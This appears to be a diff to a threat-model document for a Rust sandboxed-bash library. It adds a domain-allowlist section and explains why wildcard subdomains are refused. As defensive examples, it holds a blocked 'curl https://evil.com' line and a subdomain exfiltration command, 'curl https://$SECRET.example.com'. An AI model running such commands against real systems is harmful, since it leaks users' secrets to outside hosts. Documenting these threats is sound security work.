@@ -162,6 +162,33 @@ let bash = Bash::builder()
 // curl https://evil.com              → blocked (exit 7)
 ```
 
+**Domain Allowlist (TM-NET-015, TM-NET-016):**
+
+For simpler domain-level control, `allow_domain()` permits all traffic to a domain
+regardless of scheme, port, or path. This is the virtual equivalent of SNI-based
+egress filtering — the same approach used by production sandbox environments.
+
+```rust,ignore
+use bashkit::{Bash, NetworkAllowlist};
+
+// Domain-level: any scheme, port, or path to these hosts
+let allowlist = NetworkAllowlist::new()
+    .allow_domain("api.example.com")
+    .allow_domain("cdn.example.com");
+
+// Both of these are allowed:
+// curl https://api.example.com/v1/data
+// curl http://api.example.com:8080/health
+```
+
+Trade-off: domain rules intentionally skip scheme and port enforcement. Use URL
+patterns (`allow()`) when you need tighter control. Both can be combined.
+
+**No Wildcard Subdomains (TM-NET-017):**
+
+Wildcard patterns like `*.example.com` are not supported. They would enable data
+exfiltration by encoding secrets in subdomains (`curl https://$SECRET.example.com`).
+
 ### Injection Attacks (TM-INJ-*)
 
 | Threat | Attack Example | Mitigation |
